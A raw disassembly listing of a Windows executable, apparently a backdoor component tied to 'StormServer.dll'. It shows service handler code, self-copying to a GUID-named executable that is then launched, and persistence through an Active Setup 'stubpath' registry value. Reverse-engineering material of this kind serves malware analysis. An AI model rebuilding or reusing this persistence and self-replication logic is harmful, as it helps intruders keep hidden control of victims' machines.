.ax:004015BA                 lea     edx, [esp+230h+Buffer]
.ax:004015BE                 push    ecx             ; char
.ax:004015BF                 push    edx             ; lpBuffer
.ax:004015C0                 call    sub_401000
.ax:004015C5                 mov     edi, offset aStormserverDll ; "StormServer.dll"
.ax:004015CA                 or      ecx, 0FFFFFFFFh
.ax:004015CD                 xor     eax, eax
.ax:004015CF                 lea     edx, [esp+238h+Buffer]
.ax:004015D3                 repne scasb
.ax:004015D5                 not     ecx
.ax:004015D7                 sub     edi, ecx
.ax:004015D9                 add     esp, 4
.ax:004015DC                 mov     esi, edi
.ax:004015DE                 mov     edi, edx
.ax:004015E0                 mov     edx, ecx
.ax:004015E2                 or      ecx, 0FFFFFFFFh
.ax:004015E5                 repne scasb
.ax:004015E7                 mov     ecx, edx
.ax:004015E9                 dec     edi
.ax:004015EA                 shr     ecx, 2
.ax:004015ED                 rep movsd
.ax:004015EF                 mov     ecx, edx
.ax:004015F1                 mov     [esp+234h+var_218], esp
.ax:004015F5                 and     ecx, 3
.ax:004015F8                 rep movsb
.ax:004015FA                 mov     ecx, esp        ; this
.ax:004015FC                 push    offset aDll     ; "DLL"
.ax:00401601                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:00401606                 push    65h ; 'e'       ; int
.ax:00401608                 push    ecx             ; char
.ax:00401609                 lea     eax, [esp+23Ch+Buffer]
.ax:0040160D                 mov     ecx, esp        ; this
.ax:0040160F                 mov     [esp+23Ch+var_21C], esp
.ax:00401613                 push    eax             ; char *
.ax:00401614                 mov     [esp+240h+var_4], ebx
.ax:0040161B                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:00401620                 or      esi, 0FFFFFFFFh
.ax:00401623                 mov     [esp+23Ch+var_4], esi
.ax:0040162A                 call    sub_402460
.ax:0040162F                 add     esp, 0Ch
.ax:00401632                 cmp     al, bl
.ax:00401634                 jz      loc_4016D4
.ax:0040163A                 mov     cl, byte_404124
.ax:00401640                 lea     edx, [esp+230h+var_110]
.ax:00401647                 push    ecx             ; char
.ax:00401648                 push    edx             ; lpBuffer
.ax:00401649                 call    sub_401000
.ax:0040164E                 add     esp, 8
.ax:00401651                 lea     eax, [esp+230h+var_110]
.ax:00401658                 lea     ecx, [esp+230h+lpString] ; this
.ax:0040165C                 push    eax             ; char *
.ax:0040165D                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:00401662                 mov     edi, 1
.ax:00401667                 push    offset aStormserverDll ; "StormServer.dll"
.ax:0040166C                 lea     ecx, [esp+234h+lpString]
.ax:00401670                 mov     [esp+234h+var_4], edi
.ax:00401677                 call    ??YCString@@QAEABV0@PBD@Z ; CString::operator+=(char const *)
.ax:0040167C                 mov     ecx, [esp+230h+lpString]
.ax:00401680                 push    ecx             ; lpString
.ax:00401681                 call    sub_401150
.ax:00401686                 add     esp, 4
.ax:00401689                 test    eax, eax
.ax:0040168B                 jz      short loc_4016C4
.ax:0040168D                 mov     edx, hServiceStatus
.ax:00401693                 push    offset ServiceStatus ; lpServiceStatus
.ax:00401698                 push    edx             ; hServiceStatus
.ax:00401699                 mov     ServiceStatus.dwCheckPoint, edi
.ax:0040169F                 mov     ServiceStatus.dwCurrentState, 3
.ax:004016A9                 call    ebp ; SetServiceStatus ; ADVAPI32
.ax:004016AB                 mov     eax, hServiceStatus
.ax:004016B0                 push    offset ServiceStatus ; lpServiceStatus
.ax:004016B5                 push    eax             ; hServiceStatus
.ax:004016B6                 mov     ServiceStatus.dwCheckPoint, ebx
.ax:004016BC                 mov     ServiceStatus.dwCurrentState, edi
.ax:004016C2                 call    ebp ; SetServiceStatus ; ADVAPI32
.ax:004016C4
.ax:004016C4 loc_4016C4:                             ; CODE XREF: sub_401510+17B↑j
.ax:004016C4                 lea     ecx, [esp+230h+lpString] ; this
.ax:004016C8                 mov     [esp+230h+var_4], esi
.ax:004016CF                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:004016D4
.ax:004016D4 loc_4016D4:                             ; CODE XREF: sub_401510+124↑j
.ax:004016D4                 mov     ecx, [esp+230h+var_C]
.ax:004016DB                 pop     edi
.ax:004016DC                 pop     esi
.ax:004016DD                 pop     ebp
.ax:004016DE                 mov     large fs:0, ecx
.ax:004016E5                 pop     ebx
.ax:004016E6                 add     esp, 220h
.ax:004016EC                 retn
.ax:004016EC ; } // starts at 401510
.ax:004016EC sub_401510      endp
.ax:004016EC
.ax:004016EC ; ---------------------------------------------------------------------------
.ax:004016ED                 align 10h
.ax:004016F0
.ax:004016F0 ; =============== S U B R O U T I N E =======================================
.ax:004016F0
.ax:004016F0
.ax:004016F0 ; void __stdcall HandlerProc(DWORD dwControl)
.ax:004016F0 HandlerProc     proc near               ; DATA XREF: sub_401510+1F↑o
.ax:004016F0
.ax:004016F0 dwControl       = dword ptr  4
.ax:004016F0
.ax:004016F0                 mov     eax, [esp+dwControl]
.ax:004016F4                 push    esi
.ax:004016F5                 mov     esi, ds:SetServiceStatus ; ADVAPI32
.ax:004016FB                 dec     eax             ; switch 5 cases
.ax:004016FC                 cmp     eax, 4
.ax:004016FF                 ja      def_401705      ; jumptable 00401705 default case, case 4
.ax:00401705                 jmp     ds:jpt_401705[eax*4] ; switch jump
.ax:0040170C ; ---------------------------------------------------------------------------
.ax:0040170C
.ax:0040170C loc_40170C:                             ; CODE XREF: HandlerProc+15↑j
.ax:0040170C                                         ; DATA XREF: .ax:jpt_401705↓o
.ax:0040170C                 mov     ecx, hServiceStatus ; jumptable 00401705 case 1
.ax:00401712                 push    offset ServiceStatus
.ax:00401717                 mov     ServiceStatus.dwCheckPoint, 1
.ax:00401721                 mov     ServiceStatus.dwCurrentState, 3
.ax:0040172B                 push    ecx
.ax:0040172C                 jmp     short loc_40174E
.ax:0040172E ; ---------------------------------------------------------------------------
.ax:0040172E
.ax:0040172E loc_40172E:                             ; CODE XREF: HandlerProc+15↑j
.ax:0040172E                                         ; DATA XREF: .ax:jpt_401705↓o
.ax:0040172E                 mov     edx, hServiceStatus ; jumptable 00401705 case 5
.ax:00401734                 push    offset ServiceStatus ; lpServiceStatus
.ax:00401739                 mov     ServiceStatus.dwCheckPoint, 1
.ax:00401743                 mov     ServiceStatus.dwCurrentState, 3
.ax:0040174D                 push    edx             ; hServiceStatus
.ax:0040174E
.ax:0040174E loc_40174E:                             ; CODE XREF: HandlerProc+3C↑j
.ax:0040174E                 call    esi ; SetServiceStatus ; ADVAPI32
.ax:00401750                 push    1F4h            ; dwMilliseconds
.ax:00401755                 call    ds:Sleep        ; KERNEL32
.ax:0040175B                 mov     edx, hServiceStatus
.ax:00401761                 push    offset ServiceStatus ; lpServiceStatus
.ax:00401766                 push    edx             ; hServiceStatus
.ax:00401767                 mov     ServiceStatus.dwCheckPoint, 0
.ax:00401771                 mov     ServiceStatus.dwCurrentState, 1
.ax:0040177B                 call    esi ; SetServiceStatus ; ADVAPI32
.ax:0040177D                 pop     esi
.ax:0040177E                 retn    4
.ax:00401781 ; ---------------------------------------------------------------------------
.ax:00401781
.ax:00401781 loc_401781:                             ; CODE XREF: HandlerProc+15↑j
.ax:00401781                                         ; DATA XREF: .ax:jpt_401705↓o
.ax:00401781                 mov     eax, hServiceStatus ; jumptable 00401705 case 2
.ax:00401786                 push    offset ServiceStatus ; lpServiceStatus
.ax:0040178B                 push    eax             ; hServiceStatus
.ax:0040178C                 mov     ServiceStatus.dwCheckPoint, 1
.ax:00401796                 mov     ServiceStatus.dwCurrentState, 6
.ax:004017A0                 call    esi ; SetServiceStatus ; ADVAPI32
.ax:004017A2                 push    1F4h            ; dwMilliseconds
.ax:004017A7                 call    ds:Sleep        ; KERNEL32
.ax:004017AD                 mov     edx, hServiceStatus
.ax:004017B3                 push    offset ServiceStatus ; lpServiceStatus
.ax:004017B8                 push    edx             ; hServiceStatus
.ax:004017B9                 mov     ServiceStatus.dwCheckPoint, 0
.ax:004017C3                 mov     ServiceStatus.dwCurrentState, 7
.ax:004017CD                 call    esi ; SetServiceStatus ; ADVAPI32
.ax:004017CF                 pop     esi
.ax:004017D0                 retn    4
.ax:004017D3 ; ---------------------------------------------------------------------------
.ax:004017D3
.ax:004017D3 loc_4017D3:                             ; CODE XREF: HandlerProc+15↑j
.ax:004017D3                                         ; DATA XREF: .ax:jpt_401705↓o
.ax:004017D3                 mov     ecx, hServiceStatus ; jumptable 00401705 case 3
.ax:004017D9                 push    offset ServiceStatus ; lpServiceStatus
.ax:004017DE                 push    ecx             ; hServiceStatus
.ax:004017DF                 mov     ServiceStatus.dwCheckPoint, 1
.ax:004017E9                 mov     ServiceStatus.dwCurrentState, 5
.ax:004017F3                 call    esi ; SetServiceStatus ; ADVAPI32
.ax:004017F5                 push    1F4h            ; dwMilliseconds
.ax:004017FA                 call    ds:Sleep        ; KERNEL32
.ax:00401800                 mov     ServiceStatus.dwCheckPoint, 0
.ax:0040180A                 mov     ServiceStatus.dwCurrentState, 4
.ax:00401814
.ax:00401814 def_401705:                             ; CODE XREF: HandlerProc+F↑j
.ax:00401814                                         ; HandlerProc+15↑j
.ax:00401814                                         ; DATA XREF: ...
.ax:00401814                 mov     edx, hServiceStatus ; jumptable 00401705 default case, case 4
.ax:0040181A                 push    offset ServiceStatus ; lpServiceStatus
.ax:0040181F                 push    edx             ; hServiceStatus
.ax:00401820                 call    esi ; SetServiceStatus ; ADVAPI32
.ax:00401822                 pop     esi
.ax:00401823                 retn    4
.ax:00401823 HandlerProc     endp
.ax:00401823
.ax:00401823 ; ---------------------------------------------------------------------------
.ax:00401826                 align 4
.ax:00401828 jpt_401705      dd offset loc_40170C    ; DATA XREF: HandlerProc+15↑r
.ax:0040182C                 dd offset loc_401781    ; jump table for switch statement
.ax:00401830                 dd offset loc_4017D3
.ax:00401834                 dd offset def_401705
.ax:00401838                 dd offset loc_40172E
.ax:0040183C                 align 10h
.ax:00401840
.ax:00401840 ; =============== S U B R O U T I N E =======================================
.ax:00401840
.ax:00401840
.ax:00401840 ; char *sub_401840()
.ax:00401840 sub_401840      proc near               ; CODE XREF: sub_401900+A↓p
.ax:00401840
.ax:00401840 pguid           = GUID ptr -14h
.ax:00401840
.ax:00401840                 sub     esp, 14h
.ax:00401843                 push    0               ; pvReserved
.ax:00401845                 call    ds:CoInitialize ; ole32
.ax:0040184B                 lea     eax, [esp+14h+pguid]
.ax:0040184F                 push    eax             ; pguid
.ax:00401850                 call    ds:CoCreateGuid ; ole32
.ax:00401856                 test    eax, eax
.ax:00401858                 jnz     loc_4018E3
.ax:0040185E                 mov     ecx, dword ptr [esp+14h+pguid.Data4+7]
.ax:00401862                 mov     edx, [esp+0Eh]
.ax:00401866                 mov     eax, [esp+0Dh]
.ax:0040186A                 and     ecx, 0FFh
.ax:00401870                 push    ecx
.ax:00401871                 mov     ecx, [esp+10h]
.ax:00401875                 and     edx, 0FFh
.ax:0040187B                 and     eax, 0FFh
.ax:00401880                 push    edx
.ax:00401881                 mov     edx, dword ptr [esp+1Ch+pguid.Data4+3]
.ax:00401885                 and     ecx, 0FFh
.ax:0040188B                 push    eax
.ax:0040188C                 mov     eax, [esp+16h]
.ax:00401890                 push    ecx
.ax:00401891                 mov     ecx, [esp+19h]
.ax:00401895                 and     edx, 0FFh
.ax:0040189B                 and     eax, 0FFh
.ax:004018A0                 push    edx
.ax:004018A1                 mov     edx, [esp+1Ch]
.ax:004018A5                 and     ecx, 0FFh
.ax:004018AB                 push    eax
.ax:004018AC                 mov     eax, dword ptr [esp+2Ch+pguid.Data3]
.ax:004018B0                 push    ecx
.ax:004018B1                 mov     ecx, [esp+20h]
.ax:004018B5                 and     edx, 0FFh
.ax:004018BB                 and     eax, 0FFFFh
.ax:004018C0                 push    edx
.ax:004018C1                 mov     edx, [esp+34h+pguid.Data1]
.ax:004018C5                 and     ecx, 0FFFFh
.ax:004018CB                 push    eax
.ax:004018CC                 push    ecx
.ax:004018CD                 push    edx
.ax:004018CE                 push    offset Format   ; "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%0"...
.ax:004018D3                 push    40h ; '@'       ; BufferCount
.ax:004018D5                 push    offset Buffer   ; Buffer
.ax:004018DA                 call    ds:_snprintf    ; MSVCRT
.ax:004018E0                 add     esp, 38h
.ax:004018E3
.ax:004018E3 loc_4018E3:                             ; CODE XREF: sub_401840+18↑j
.ax:004018E3                 call    ds:CoUninitialize ; ole32
.ax:004018E9                 mov     eax, offset Buffer
.ax:004018EE                 add     esp, 14h
.ax:004018F1                 retn
.ax:004018F1 sub_401840      endp
.ax:004018F1
.ax:004018F1 ; ---------------------------------------------------------------------------
.ax:004018F2                 align 10h
.ax:00401900
.ax:00401900 ; =============== S U B R O U T I N E =======================================
.ax:00401900
.ax:00401900
.ax:00401900 ; BOOL sub_401900()
.ax:00401900 sub_401900      proc near               ; CODE XREF: WinMain(x,x,x,x)+2DA↓p
.ax:00401900
.ax:00401900 var_368         = dword ptr -368h
.ax:00401900 phkResult       = dword ptr -364h
.ax:00401900 StartupInfo     = _STARTUPINFOA ptr -360h
.ax:00401900 ProcessInformation= _PROCESS_INFORMATION ptr -31Ch
.ax:00401900 String          = byte ptr -30Ch
.ax:00401900 SubKey          = byte ptr -208h
.ax:00401900 Filename        = byte ptr -104h
.ax:00401900
.ax:00401900                 sub     esp, 368h
.ax:00401906                 push    ebx
.ax:00401907                 push    ebp
.ax:00401908                 push    esi
.ax:00401909                 push    edi
.ax:0040190A                 call    sub_401840
.ax:0040190F                 mov     ebx, eax
.ax:00401911                 mov     ecx, 41h ; 'A'
.ax:00401916                 xor     eax, eax
.ax:00401918                 lea     edi, [esp+378h+SubKey]
.ax:0040191F                 rep stosd
.ax:00401921                 mov     ecx, 41h ; 'A'
.ax:00401926                 lea     edi, [esp+378h+String]
.ax:0040192A                 rep stosd
.ax:0040192C                 mov     ecx, 41h ; 'A'
.ax:00401931                 lea     edi, [esp+378h+Filename]
.ax:00401938                 rep stosd
.ax:0040193A                 mov     al, byte_404124
.ax:0040193F                 lea     ecx, [esp+378h+String]
.ax:00401943                 push    eax             ; char
.ax:00401944                 push    ecx             ; lpBuffer
.ax:00401945                 mov     [esp+380h+var_368], ebx
.ax:00401949                 call    sub_401000
.ax:0040194E                 mov     edi, ebx
.ax:00401950                 or      ecx, 0FFFFFFFFh
.ax:00401953                 xor     eax, eax
.ax:00401955                 add     esp, 8
.ax:00401958                 repne scasb
.ax:0040195A                 not     ecx
.ax:0040195C                 sub     edi, ecx
.ax:0040195E                 lea     edx, [esp+378h+String]
.ax:00401962                 mov     esi, edi
.ax:00401964                 mov     ebp, ecx
.ax:00401966                 mov     edi, edx
.ax:00401968                 or      ecx, 0FFFFFFFFh
.ax:0040196B                 repne scasb
.ax:0040196D                 mov     ecx, ebp
.ax:0040196F                 dec     edi
.ax:00401970                 shr     ecx, 2
.ax:00401973                 rep movsd
.ax:00401975                 mov     ecx, ebp
.ax:00401977                 lea     edx, [esp+378h+String]
.ax:0040197B                 and     ecx, 3
.ax:0040197E                 push    104h            ; nSize
.ax:00401983                 rep movsb
.ax:00401985                 mov     edi, offset SubStr ; ".exe"
.ax:0040198A                 or      ecx, 0FFFFFFFFh
.ax:0040198D                 repne scasb
.ax:0040198F                 not     ecx
.ax:00401991                 sub     edi, ecx
.ax:00401993                 mov     esi, edi
.ax:00401995                 mov     ebp, ecx
.ax:00401997                 mov     edi, edx
.ax:00401999                 or      ecx, 0FFFFFFFFh
.ax:0040199C                 repne scasb
.ax:0040199E                 mov     ecx, ebp
.ax:004019A0                 dec     edi
.ax:004019A1                 shr     ecx, 2
.ax:004019A4                 rep movsd
.ax:004019A6                 mov     ecx, ebp
.ax:004019A8                 lea     eax, [esp+37Ch+Filename]
.ax:004019AF                 and     ecx, 3
.ax:004019B2                 push    eax             ; lpFilename
.ax:004019B3                 rep movsb
.ax:004019B5                 push    0               ; hModule
.ax:004019B7                 call    ds:GetModuleFileNameA ; KERNEL32
.ax:004019BD                 mov     edi, offset aSoftwareMicros ; "SOFTWARE\\Microsoft\\Active Setup\\Inst"...
.ax:004019C2                 or      ecx, 0FFFFFFFFh
.ax:004019C5                 xor     eax, eax
.ax:004019C7                 lea     edx, [esp+378h+SubKey]
.ax:004019CE                 repne scasb
.ax:004019D0                 not     ecx
.ax:004019D2                 sub     edi, ecx
.ax:004019D4                 mov     eax, ecx
.ax:004019D6                 mov     esi, edi
.ax:004019D8                 mov     edi, edx
.ax:004019DA                 lea     edx, [esp+378h+SubKey]
.ax:004019E1                 shr     ecx, 2
.ax:004019E4                 rep movsd
.ax:004019E6                 mov     ecx, eax
.ax:004019E8                 and     ecx, 3
.ax:004019EB                 rep movsb
.ax:004019ED                 mov     edi, ebx
.ax:004019EF                 or      ecx, 0FFFFFFFFh
.ax:004019F2                 xor     eax, eax
.ax:004019F4                 repne scasb
.ax:004019F6                 not     ecx
.ax:004019F8                 sub     edi, ecx
.ax:004019FA                 mov     esi, edi
.ax:004019FC                 mov     ebx, ecx
.ax:004019FE                 mov     edi, edx
.ax:00401A00                 or      ecx, 0FFFFFFFFh
.ax:00401A03                 repne scasb
.ax:00401A05                 mov     ecx, ebx
.ax:00401A07                 dec     edi
.ax:00401A08                 shr     ecx, 2
.ax:00401A0B                 rep movsd
.ax:00401A0D                 mov     ecx, ebx
.ax:00401A0F                 lea     eax, [esp+378h+phkResult]
.ax:00401A13                 and     ecx, 3
.ax:00401A16                 push    eax             ; phkResult
.ax:00401A17                 rep movsb
.ax:00401A19                 lea     ecx, [esp+37Ch+SubKey]
.ax:00401A20                 push    ecx             ; lpSubKey
.ax:00401A21                 push    80000002h       ; hKey
.ax:00401A26                 call    ds:RegCreateKeyA ; ADVAPI32
.ax:00401A2C                 lea     edx, [esp+378h+String]
.ax:00401A30                 push    edx             ; lpString
.ax:00401A31                 call    ds:lstrlenA     ; KERNEL32
.ax:00401A37                 mov     ecx, [esp+378h+phkResult]
.ax:00401A3B                 push    eax             ; cbData
.ax:00401A3C                 lea     eax, [esp+37Ch+String]
.ax:00401A40                 push    eax             ; lpData
.ax:00401A41                 push    2               ; dwType
.ax:00401A43                 push    0               ; Reserved
.ax:00401A45                 push    offset aStubpath ; "stubpath"
.ax:00401A4A                 push    ecx             ; hKey
.ax:00401A4B                 call    ds:RegSetValueExA ; ADVAPI32
.ax:00401A51                 mov     edx, [esp+378h+phkResult]
.ax:00401A55                 push    edx             ; hKey
.ax:00401A56                 call    ds:RegCloseKey  ; ADVAPI32
.ax:00401A5C                 lea     eax, [esp+378h+Filename]
.ax:00401A63                 push    offset Mode     ; "rb"
.ax:00401A68                 push    eax             ; FileName
.ax:00401A69                 call    ds:fopen        ; MSVCRT
.ax:00401A6F                 mov     edi, ds:fseek   ; MSVCRT
.ax:00401A75                 mov     esi, eax
.ax:00401A77                 push    2               ; Origin
.ax:00401A79                 push    0               ; Offset
.ax:00401A7B                 push    esi             ; Stream
.ax:00401A7C                 call    edi ; fseek     ; MSVCRT
.ax:00401A7E                 push    esi             ; Stream
.ax:00401A7F                 call    ds:ftell        ; MSVCRT
.ax:00401A85                 push    0               ; Origin
.ax:00401A87                 push    0               ; Offset
.ax:00401A89                 push    esi             ; Stream
.ax:00401A8A                 mov     ebp, eax
.ax:00401A8C                 call    edi ; fseek     ; MSVCRT
.ax:00401A8E                 push    ebp             ; Size
.ax:00401A8F                 call    ds:malloc       ; MSVCRT
.ax:00401A95                 mov     ecx, ebp
.ax:00401A97                 mov     ebx, eax
.ax:00401A99                 mov     edx, ecx
.ax:00401A9B                 xor     eax, eax
.ax:00401A9D                 mov     edi, ebx
.ax:00401A9F                 push    esi             ; Stream
.ax:00401AA0                 shr     ecx, 2
.ax:00401AA3                 rep stosd
.ax:00401AA5                 mov     ecx, edx
.ax:00401AA7                 push    1               ; ElementCount
.ax:00401AA9                 and     ecx, 3
.ax:00401AAC                 push    ebp             ; ElementSize
.ax:00401AAD                 rep stosb
.ax:00401AAF                 push    ebx             ; Buffer
.ax:00401AB0                 call    ds:fread        ; MSVCRT
.ax:00401AB6                 push    esi             ; Stream
.ax:00401AB7                 call    ds:fclose       ; MSVCRT
.ax:00401ABD                 mov     edi, [esp+3B4h+var_368]
.ax:00401AC1                 lea     edx, [ebx+3058h]
.ax:00401AC7                 or      ecx, 0FFFFFFFFh
.ax:00401ACA                 mov     dword ptr [ebx+6A0h], 4
.ax:00401AD4                 lea     esi, [edx+20h]
.ax:00401AD7                 xor     eax, eax
.ax:00401AD9                 repne scasb
.ax:00401ADB                 not     ecx
.ax:00401ADD                 sub     edi, ecx
.ax:00401ADF                 mov     [esp+3B4h+var_368], esi
.ax:00401AE3                 mov     eax, ecx
.ax:00401AE5                 mov     esi, edi
.ax:00401AE7                 mov     edi, [esp+3B4h+var_368]
.ax:00401AEB                 push    offset aWb      ; "wb"
.ax:00401AF0                 shr     ecx, 2
.ax:00401AF3                 rep movsd
.ax:00401AF5                 mov     ecx, eax
.ax:00401AF7                 xor     eax, eax
.ax:00401AF9                 and     ecx, 3
.ax:00401AFC                 rep movsb
.ax:00401AFE                 mov     ecx, 8
.ax:00401B03                 mov     edi, edx
.ax:00401B05                 rep stosd
.ax:00401B07                 lea     ecx, [esp+3B8h+String]
.ax:00401B0E                 mov     byte ptr [edx], 4
.ax:00401B11                 push    ecx             ; FileName
.ax:00401B12                 call    ds:fopen        ; MSVCRT
.ax:00401B18                 add     esp, 44h
.ax:00401B1B                 mov     esi, eax
.ax:00401B1D                 mov     edi, 1
.ax:00401B22                 push    esi             ; Stream
.ax:00401B23                 push    edi             ; ElementCount
.ax:00401B24                 push    ebp             ; ElementSize
.ax:00401B25                 push    ebx             ; Buffer
.ax:00401B26                 call    ds:fwrite       ; MSVCRT
.ax:00401B2C                 push    esi             ; Stream
.ax:00401B2D                 call    ds:fclose       ; MSVCRT
.ax:00401B33                 push    ebx             ; Block
.ax:00401B34                 call    ds:free         ; MSVCRT
.ax:00401B3A                 add     esp, 18h
.ax:00401B3D                 lea     edx, [esp+378h+ProcessInformation]
.ax:00401B41                 lea     ecx, [esp+378h+StartupInfo]
.ax:00401B45                 xor     eax, eax
.ax:00401B47                 push    edx             ; lpProcessInformation
.ax:00401B48                 push    ecx             ; lpStartupInfo
.ax:00401B49                 push    eax             ; lpCurrentDirectory
.ax:00401B4A                 push    eax             ; lpEnvironment
.ax:00401B4B                 push    eax             ; dwCreationFlags
.ax:00401B4C                 push    eax             ; bInheritHandles
.ax:00401B4D                 push    eax             ; lpThreadAttributes
.ax:00401B4E                 lea     edx, [esp+394h+String]
.ax:00401B55                 push    eax             ; lpProcessAttributes
.ax:00401B56                 push    edx             ; lpCommandLine
.ax:00401B57                 push    eax             ; lpApplicationName
.ax:00401B58                 mov     [esp+3A0h+StartupInfo.cb], 44h ; 'D'
.ax:00401B60                 mov     [esp+3A0h+StartupInfo.lpDesktop], eax
.ax:00401B64                 mov     [esp+3A0h+StartupInfo.lpReserved], eax
.ax:00401B68                 mov     [esp+3A0h+StartupInfo.lpTitle], eax
.ax:00401B6C                 mov     [esp+3A0h+StartupInfo.dwFlags], edi
.ax:00401B70                 mov     [esp+3A0h+StartupInfo.cbReserved2], ax
.ax:00401B75                 mov     [esp+3A0h+StartupInfo.lpReserved2], eax
.ax:00401B79                 mov     [esp+3A0h+StartupInfo.wShowWindow], di
.ax:00401B7E                 call    ds:CreateProcessA ; KERNEL32
.ax:00401B84                 pop     edi
.ax:00401B85                 pop     esi
.ax:00401B86                 pop     ebp
.ax:00401B87                 pop     ebx
.ax:00401B88                 add     esp, 368h
.ax:00401B8E                 retn
.ax:00401B8E sub_401900      endp
.ax:00401B8E
.ax:00401B8E ; ---------------------------------------------------------------------------
.ax:00401B8F                 align 10h
.ax:00401B90
.ax:00401B90 ; =============== S U B R O U T I N E =======================================
.ax:00401B90
.ax:00401B90
.ax:00401B90 ; void sub_401B90()
.ax:00401B90 sub_401B90      proc near               ; CODE XREF: WinMain(x,x,x,x)+30A↓p
.ax:00401B90
.ax:00401B90 lpString        = dword ptr -220h
.ax:00401B90 var_21C         = dword ptr -21Ch
.ax:00401B90 var_218         = dword ptr -218h
.ax:00401B90 Buffer          = byte ptr -214h
.ax:00401B90 var_110         = byte ptr -110h
.ax:00401B90 var_C           = dword ptr -0Ch
.ax:00401B90 var_4           = dword ptr -4
.ax:00401B90
.ax:00401B90 ; FUNCTION CHUNK AT .ax:00402840 SIZE 00000020 BYTES
.ax:00401B90
.ax:00401B90 ; __unwind { // SEH_401B90
.ax:00401B90                 push    0FFFFFFFFh
.ax:00401B92                 push    offset SEH_401B90
.ax:00401B97                 mov     eax, large fs:0
.ax:00401B9D                 push    eax
.ax:00401B9E                 mov     large fs:0, esp
.ax:00401BA5                 sub     esp, 214h
.ax:00401BAB                 mov     al, byte_404124
.ax:00401BB0                 push    ebp
.ax:00401BB1                 push    esi
.ax:00401BB2                 push    edi
.ax:00401BB3                 lea     ecx, [esp+22Ch+Buffer]
.ax:00401BB7                 push    eax             ; char
.ax:00401BB8                 push    ecx             ; lpBuffer
.ax:00401BB9                 call    sub_401000
.ax:00401BBE                 mov     edi, offset aStormserverDll ; "StormServer.dll"
.ax:00401BC3                 or      ecx, 0FFFFFFFFh
.ax:00401BC6                 xor     eax, eax
.ax:00401BC8                 lea     edx, [esp+234h+Buffer]
.ax:00401BCC                 repne scasb
.ax:00401BCE                 not     ecx
.ax:00401BD0                 sub     edi, ecx
.ax:00401BD2                 add     esp, 4
.ax:00401BD5                 mov     esi, edi
.ax:00401BD7                 mov     ebp, ecx
.ax:00401BD9                 mov     edi, edx
.ax:00401BDB                 or      ecx, 0FFFFFFFFh
.ax:00401BDE                 repne scasb
.ax:00401BE0                 mov     ecx, ebp
.ax:00401BE2                 dec     edi
.ax:00401BE3                 shr     ecx, 2
.ax:00401BE6                 rep movsd
.ax:00401BE8                 mov     ecx, ebp
.ax:00401BEA                 mov     [esp+230h+var_218], esp
.ax:00401BEE                 and     ecx, 3
.ax:00401BF1                 rep movsb
.ax:00401BF3                 mov     ecx, esp        ; this
.ax:00401BF5                 push    offset aDll     ; "DLL"
.ax:00401BFA                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:00401BFF                 push    65h ; 'e'       ; int
.ax:00401C01                 push    ecx             ; char
.ax:00401C02                 lea     eax, [esp+238h+Buffer]
.ax:00401C06                 mov     ecx, esp        ; this
.ax:00401C08                 mov     [esp+238h+var_21C], esp
.ax:00401C0C                 push    eax             ; char *
.ax:00401C0D                 mov     [esp+23Ch+var_4], 0
.ax:00401C18                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:00401C1D                 mov     [esp+238h+var_4], 0FFFFFFFFh
.ax:00401C28                 call    sub_402460
.ax:00401C2D                 add     esp, 0Ch
.ax:00401C30                 test    al, al
.ax:00401C32                 jz      short loc_401C98
.ax:00401C34                 mov     cl, byte_404124
.ax:00401C3A                 lea     edx, [esp+22Ch+var_110]
.ax:00401C41                 push    ecx             ; char
.ax:00401C42                 push    edx             ; lpBuffer
.ax:00401C43                 call    sub_401000
.ax:00401C48                 add     esp, 8
.ax:00401C4B                 lea     eax, [esp+22Ch+var_110]
.ax:00401C52                 lea     ecx, [esp+22Ch+lpString] ; this
.ax:00401C56                 push    eax             ; char *
.ax:00401C57                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:00401C5C                 push    offset aStormserverDll ; "StormServer.dll"
.ax:00401C61                 lea     ecx, [esp+230h+lpString]
.ax:00401C65                 mov     [esp+230h+var_4], 1
.ax:00401C70                 call    ??YCString@@QAEABV0@PBD@Z ; CString::operator+=(char const *)
.ax:00401C75                 mov     ecx, [esp+22Ch+lpString]
.ax:00401C79                 push    ecx             ; lpString
.ax:00401C7A                 call    sub_401150
.ax:00401C7F                 add     esp, 4
.ax:00401C82                 lea     ecx, [esp+22Ch+lpString] ; this
.ax:00401C86                 test    eax, eax
.ax:00401C88                 mov     [esp+22Ch+var_4], 0FFFFFFFFh
.ax:00401C93                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00401C98
.ax:00401C98 loc_401C98:                             ; CODE XREF: sub_401B90+A2↑j
.ax:00401C98                 mov     ecx, [esp+22Ch+var_C]
.ax:00401C9F                 pop     edi
.ax:00401CA0                 pop     esi
.ax:00401CA1                 mov     large fs:0, ecx
.ax:00401CA8                 pop     ebp
.ax:00401CA9                 add     esp, 220h
.ax:00401CAF                 retn
.ax:00401CAF ; } // starts at 401B90
.ax:00401CAF sub_401B90      endp
.ax:00401CAF
.ax:00401CB0
.ax:00401CB0 ; =============== S U B R O U T I N E =======================================
.ax:00401CB0
.ax:00401CB0
.ax:00401CB0 ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
.ax:00401CB0 _WinMain@16     proc near               ; CODE XREF: start+12F↓p
.ax:00401CB0
.ax:00401CB0 lpString        = dword ptr -330h
.ax:00401CB0 var_32C         = byte ptr -32Ch
.ax:00401CB0 cbData          = dword ptr -328h
.ax:00401CB0 Type            = dword ptr -324h
.ax:00401CB0 phkResult       = dword ptr -320h
.ax:00401CB0 ServiceStartTable= SERVICE_TABLE_ENTRYA ptr -31Ch
.ax:00401CB0 var_314         = dword ptr -314h
.ax:00401CB0 var_310         = dword ptr -310h
.ax:00401CB0 Data            = byte ptr -30Ch
.ax:00401CB0 var_30B         = byte ptr -30Bh
.ax:00401CB0 Buffer          = byte ptr -208h
.ax:00401CB0 var_104         = byte ptr -104h
.ax:00401CB0 hInstance       = dword ptr  4
.ax:00401CB0 hPrevInstance   = dword ptr  8
.ax:00401CB0 lpCmdLine       = dword ptr  0Ch
.ax:00401CB0 nShowCmd        = dword ptr  10h
.ax:00401CB0
